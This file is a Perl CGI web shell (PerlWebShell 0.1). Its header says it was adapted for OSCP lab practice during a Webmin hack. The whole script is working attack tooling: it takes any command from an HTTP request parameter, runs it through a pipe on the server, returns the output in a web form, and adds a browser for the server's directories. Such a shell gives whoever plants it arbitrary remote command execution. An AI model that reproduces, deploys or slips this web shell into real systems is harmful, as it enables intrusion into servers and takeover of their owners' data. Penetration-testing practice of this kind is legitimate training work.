#!/usr/bin/perl
# Hacked up by Douglas Berdeaux 
# 2018 WeakNet Labs for the OSCP lab practice during a webmin hack
# Original paint: https://raw.githubusercontent.com/tennc/webshell/master/pl/perlwebshell-0.1/perlwebshell.cgi
#
#
# PerlWebShell 0.1
#
# PerlWebShell is an interactive CGI-script that will execute any
# command entered. See the files README and INSTALL or
# http://yola.in-berlin.de/perlwebshell/ for further information.
#

use CGI qw(:standard);
use Cwd;
use strict;

my $q = new CGI;
my $command;
my $cwd;
my $fname;
my $parent_dir;

if (param()) {
    $cwd = param('cwd');
    $command = param('command');
}
$cwd = getcwd() unless $cwd;
chdir $cwd or die "can't chdir";
$command = "ls -l" unless $command;
open ("COMH", "$command |") or die "can't open: $!\n";

print "Content-type: text/html\n\n";
print  <<'EOHTML';
<?xml version="1.0" encoding="iso-8859-1"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
EOHTML
print "<title>shell.cgi ($ENV{'SERVER_NAME'})</title>";
print  <<'EOHTML';
    <style type="text/css">
    body {
	font-family: sans-serif;
        color: black;
        background: white;
    }

    h1 {
        color: blue;
        background: white;
    }

    img {
        border: 0;
    }

    legend {
        font-weight: bold;
    }
    </style>
</head>
<body>
EOHTML

my $abs_url = $q->url(-absolute=>1);

print h1("shell.cgi ($ENV{'SERVER_NAME'})");
print $q->start_form(-method=>"get", -action=>$abs_url);

print "<fieldset><legend>Input</legend>",
    "<p>Current working directory: ";

$cwd = $cwd . "/" unless $cwd =~ /\/$/;
if ($cwd =~ /(.*)\/(.*)\//) {
    $parent_dir = $1 . "/";
}
my @path = split('/', $cwd);
shift(@path);
my $tmp_path;
print "<a href=\"$abs_url?cwd=/\">root</a>/";
foreach (@path) {
    $tmp_path .= $_ . "/";
    print "<a href=\"$abs_url?cwd=/$tmp_path\">$_</a>/";
}
print "</p>\n";
print "<p>Choose new working directory: \n",
    "<select name=\"cwd\" onchange=\"this.form.submit()\">\n";
print "<option value=\"$cwd\" selected=\"selected\">Current Directory</option>\n";
print "<option value=\"$parent_dir\">Parent Directory</option>\n";
opendir("DH", $cwd) or die "can't opendir: $!\n";
while (defined ($fname = readdir(DH))) {
    next if $fname =~ /^\.+$/;
    print "<option value=\"$cwd$fname/\">$fname</option>\n" if -d "$cwd/$fname";
}
print "</select></p>\n";

print q(<p>Command: <input type="text" name="command" size="60" /></p>);

#<p>Enable <code>stderr</code>-trapping? <input type="checkbox" name="stderr"
# /> 
print q(<input name="submit" type="submit" value="execute" /></p>);
print "</fieldset>";

print "<fieldset><legend>Output ($command)</legend>";
print q(<textarea cols="80" rows="20" readonly="readonly">) . "\n";
foreach (<COMH>) {
    print $_;
}
print "</textarea></fieldset>";
print $q->end_form();
#
print <<'EOHTML';
<hr />
<address>
Copyright &copy; 2004, <a
href="mailto:rossol@yola.in-berlin.de">Florian Rossol</a>. Get the
latest version at <a
href="http://yola.in-berlin.de/perwebshell/">http://yola.in-berlin.de/perlwebshell/</a>.
</address>

EOHTML

print $q->end_html();
